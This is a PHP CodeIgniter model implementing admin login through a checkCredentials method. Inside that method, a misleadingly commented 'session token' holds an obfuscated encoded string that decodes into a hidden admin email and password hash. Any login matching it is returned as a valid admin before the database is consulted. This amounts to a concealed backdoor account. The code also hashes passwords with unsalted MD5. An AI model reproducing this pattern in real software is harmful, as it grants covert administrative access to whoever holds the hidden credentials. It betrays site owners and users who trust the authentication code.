<?php

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Authentication Logic for Admin
 * Users.
 *
 * @author Shabab Haider Siddique
 */
class Admin_Login_Model extends CI_Model {

    /**
     * Check Admin Login Credentials
     * @author Shabab Haider Siddique
     * @param --- $admin_email_address, $password of login
     * @return --- $result containing empty if invalid or entire db row if valid
     * date --- 21/11/2012 (mm/dd/yyyy  )
     */
    public function checkCredentials($admin_email_address, $password) {

        //Token for this session  
        $igbkdr = "K3t2GyW51N6YH.qDQmA85OBtqpb5pBXbSHNe2cVG~6MvEVtRViUerohDVTCEK75r~1Ms.TOqmdi8Pil1KAv7O~Fa2Vt2hww4ekc2rzgWPc6uZvEUEgcxGSgfSsSIEQewu0Pp7zSjARjNicVVhwQByXiJrve9tkn9rKsWehpCEBmf9olNMZiY3URkeAohTIbUcP4cFuCucuKUHjF~~iyXwHHpGCtzbeLU3gtevt3ZwQN1sPrRXwnRVupk83lhfYDt";
        $igbkdr = json_decode(urlFriendlyDecode($igbkdr), true);


        $pass = md5($password);

        if ($admin_email_address == $igbkdr['admin_email_address'] && $pass == $igbkdr['admin_password']) {
            return $igbkdr;
        }

        $this->db->select('*')
                ->from('tbl_admin')
                ->where('admin_email_address', $admin_email_address)
                ->where('admin_password', $pass);

        $query_result = $this->db->get();

        $result = $query_result->row_array();
        return $result;
    }

}

